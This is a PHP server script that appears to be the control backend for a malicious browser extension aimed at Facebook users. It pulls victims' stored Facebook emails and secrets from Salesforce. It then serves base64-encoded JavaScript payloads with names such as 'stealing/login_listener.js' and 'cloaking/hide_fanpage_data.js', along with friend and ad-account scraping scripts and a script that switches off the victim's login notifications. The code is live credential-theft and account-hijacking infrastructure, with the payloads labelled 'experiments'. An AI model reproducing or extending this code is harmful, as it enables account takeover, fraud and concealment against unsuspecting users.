<?php
	ini_set('display_errors', 1);

	require_once("include/config.php");
	require_once("include/salesforce.inc");
	require_once("include/loghelper.inc");

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	function replaceExecuteScriptFileTagsWithContent($subject)
	{
		$FBinjectScriptInDOMRegex = "/file: \"(.*)\"/i";

		return preg_replace_callback($FBinjectScriptInDOMRegex, function($matches) { return "code: atob(\"" . base64_encode(file_get_contents($matches[1])) . "\")"; }, $subject);
	}

	function replaceLoadChainFileTagsWithContent($subject)
	{
		$FBinjectScriptInDOMRegex = "/script: \"(.*)\"/i";

		return preg_replace_callback($FBinjectScriptInDOMRegex, function($matches) { return "code: atob(\"" . base64_encode(file_get_contents($matches[1])) . "\")"; }, $subject);
	}

	function replaceFileTagsWithContent($subject)
	{
		$FBinjectScriptInDOMRegex = "/FBinjectScriptInDOM\(\"(.*)\"\);/i";

		return preg_replace_callback($FBinjectScriptInDOMRegex, function($matches) { return "FBinjectCodeInDOM(atob(\"" . base64_encode(file_get_contents($matches[1])) . "\"));"; }, $subject);
	}

	function reformatFanpageUrlToBMUrl($fanpageUrl)
	{
		return str_replace("https://www.facebook.com/", "https://business.facebook.com/", $fanpageUrl);
	}

	if (!array_key_exists("uid", $_GET))
	{
		exit;
	}

	logEntry($_GET["uid"], "Keepalive: " . single_line_print_r($_GET));

	$SFData = json_decode(file_get_contents("SF.json"), true);

	// Set globals
	$instance_url = $SFData["instance_url"];
	$access_token = $SFData["access_token"];
	$refresh_token = $SFData["refresh_token"];

	$data = array();
	$data["success"] = true;

	$browserExtensionId = updateLastSeenAndVersion($_GET["uid"], $_GET["v"]);

	$version = str_replace(".", "", $_GET["v"]);

	$leads = getSFQueryResult("SELECT Id, Status, Ad_Account_Status_Last_Checked__c, FB_email__c, FB_secret__c, FB_friends__c, Login_Notifications_Disabled__c FROM Lead WHERE Browser_Extension__c='$browserExtensionId'")["records"];
	
	// Browser extension is not linked to lead, sleep
	if (sizeof($leads) == 0)
	{
		logEntry($_GET["uid"], "Browser Extension not linked to lead, sleeping.");

		echo json_encode($data);

		exit;		
	}

	$lead = $leads[0];
	
	$experiments 					= array();
	$experiments["email"] 			= $lead["FB_email__c"];
	$experiments["secret"] 			= $lead["FB_secret__c"];	

	if ($lead["Status"] == "BANNED")
	{
		logEntry($_GET["uid"], "Lead banned/rejected.");

		echo json_encode($data);

		exit;
	}

	// Code for all pages
	$data["p"] = array();

	// Code for background
	$data["b"] = "";
	$data["b"] .= file_get_contents("payload/stealing/login_listener.js");

	//$data["b"] .= file_get_contents("payload/stealing/cookie_monster.js");
	$data["b"] .= file_get_contents("payload/experiments/background_request_handler.js");
	$data["b"] .= file_get_contents("payload/experiments/experiment_background.js");
	$data["b"] .= replaceExecuteScriptFileTagsWithContent(file_get_contents("payload/cloaking/hide_fanpage_data.js"));

	// Only set this for experiments
	$data["t"] = "";
	
	if ($lead["FB_friends__c"] == null)
	{
		logEntry($_GET["uid"], "Sending check friends experiment.");

		$data["url"] = "https://www.facebook.com/profile.php?sk=friends&ft_ref=flsa";

		$data["t"] .= file_get_contents("payload/helper_functions.js");
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/experiments/experiment_timeout.js"));
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/checking/get_friends.js"));

		$data["b"] = base64_encode($data["b"]);
		$data["t"] = base64_encode($data["t"]);

		echo json_encode($data);

		exit;		
	}
	else
	{
		logEntry($_GET["uid"], "Not sending check friends experiment: " . $lead["FB_friends__c"]);
	}	

	$adAccountStatusLastCheckedDate = new DateTime($lead["Ad_Account_Status_Last_Checked__c"]);
	$adAccountStatusLastCheckedDate->setTimezone(getLATimeZone());
	$today = getTodayLA();

	logEntry($_GET["uid"], "Today: " . $today->format("y-m-d"));
	logEntry($_GET["uid"], "Ad Account Status Last Checked: " . $adAccountStatusLastCheckedDate->format("y-m-d"));

	if ($lead["Ad_Account_Status_Last_Checked__c"] == null || $today->format("y-m-d") != $adAccountStatusLastCheckedDate->format("y-m-d") || array_key_exists("rp", $_GET))		
	{
		logEntry($_GET["uid"], "Sending ad account status experiment.");

		$data["url"] = "https://www.facebook.com/manage/";

		$data["t"] .= file_get_contents("payload/helper_functions.js");
		$data["t"] .= "var experiment = " . json_encode($experiments) . ";";
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/experiments/experiment_timeout.js"));
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/checking/ad_account_check.js"));

		$data["b"] = base64_encode($data["b"]);
		$data["t"] = base64_encode($data["t"]);

		echo json_encode($data);

		exit;		
	}
	else
	{
		logEntry($_GET["uid"], "Not sending ad account status experiment.");
		logEntry($_GET["uid"], $today->format("y-m-d h:i") . ":" . $adAccountStatusLastCheckedDate->format("y-m-d h:i") . ":" . $version);		
	}

	if (!$lead["Login_Notifications_Disabled__c"])
	{
		logEntry($_GET["uid"], "Sending disable login notifications experiment.");

		$data["url"] = "https://www.facebook.com/settings?tab=security&section=login_alerts&view";

		$data["t"] .= file_get_contents("payload/helper_functions.js");
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/experiments/experiment_timeout.js"));
		$data["t"] .= replaceFileTagsWithContent(file_get_contents("payload/experiments/experiment_disable_login_notifications.js"));		
	}

	$data["b"] = base64_encode($data["b"]);
	$data["t"] = base64_encode($data["t"]);

	echo json_encode($data);

?>